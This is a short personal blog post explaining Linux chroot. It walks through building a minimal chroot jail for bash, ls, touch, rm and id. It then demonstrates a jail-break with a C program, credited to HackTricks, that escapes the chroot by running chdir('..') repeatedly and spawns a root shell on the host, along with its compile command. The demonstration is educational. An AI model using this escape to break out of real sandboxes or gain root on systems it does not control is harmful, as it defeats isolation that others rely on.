---
layout: post
title: Looking into CHROOT
categories: [Linux]
---


## **What is Chroot?**

According to linux documentation...

> chroot - run command or interactive shell with special root directory

 Chroot is used in lots of different situation. As creating isolated testing environment for developers, running deprecated software that require older libraries, recovery filesystem...

  I remembered i use it when installing arch linux few years back, it also save me when my GRUB bootloader get broken on my old ubuntu PC. 

## **Practice**

 Okay enough chit-chat, let's roll out sleeves and deep dive into chroot. I will create simple sandbox bash environment with few commands as `touch`, `rm`, `ls` and `id`.  You need any linux distribution where you have admin/sudo rights. I used Ubuntu desktop for this example.

I created folder chroot-jail inside my home directory

```bash 
mkdir chroot-jail
```

I need to create folders bin,lib,lib64 and urs inside my newly created folder. 

```
mkdir -p chroot-jail/{bin,lib,lib64,usr/bin}
```
{} help me create multiple folders in my chroot-jail folder 
-p help me create folder bin inside urs inside chroot-jail :) it help create nested folders

![](/images/chroot/01-folders.png)

Now I need to copy all binaries I want to use. As I mentioned before I will copy `bash`,`touch`,`ls` and `rm` into my chroot-jail/bin folder and `id` into chroot-jail/usr/bin

![](/images/chroot/02-copy.png)

It's not that easy just copy binaries over. Every binary has some library dependencies. I need to copy that library into correct lib folder. To check dependencies I used `ldd` command.

![](/images/chroot/03-ldd.png)

I can see `bash` binary depends on few libraries. 3 of them I copied to lib folder and last one to lib64 folder. I will do exact same thing for `touch`,`ls`,`rm` and `id` binaries. If no missing library is there we can run command 

```bash 
sudo chroot chroot-jail /bin/bash
```

![](/images/chroot/04-jail.png)

I am in new shell. I can test all binaries I copied before. I can see all of them are working as expected. If I want to run binaries that are not inside my chroot-jail folder I will get error message.

![](/images/chroot/05-error.png)

## **Jail-break**

Chroot is not security feature. As you can see from man pages

> In particular, it is not intended
       to be used for any kind of security purpose, neither to fully
       sandbox a process nor to restrict filesystem system calls. 

If I looked into [Hacktricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-limited-bash) and there was really nice C script for escaping. It looks like this...

```bash
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>
//gcc break_chroot.c -o break_chroot
int main(void)
{
    mkdir("chroot-dir", 0755);
    chroot("chroot-dir");
    for(int i = 0; i < 1000; i++) {
        chdir("..");
    }
    chroot(".");
    system("/bin/bash");
}
```

I can compile this script with this command

```bash 
gcc script.c -o spyx
```

and copy it into my chroot-jail folder and test it. 

![](/images/chroot/06-break.png)

I became root on my own hosts! As we can see I became immediate root because I run chroot with sudo privileges.

Thanks for reading....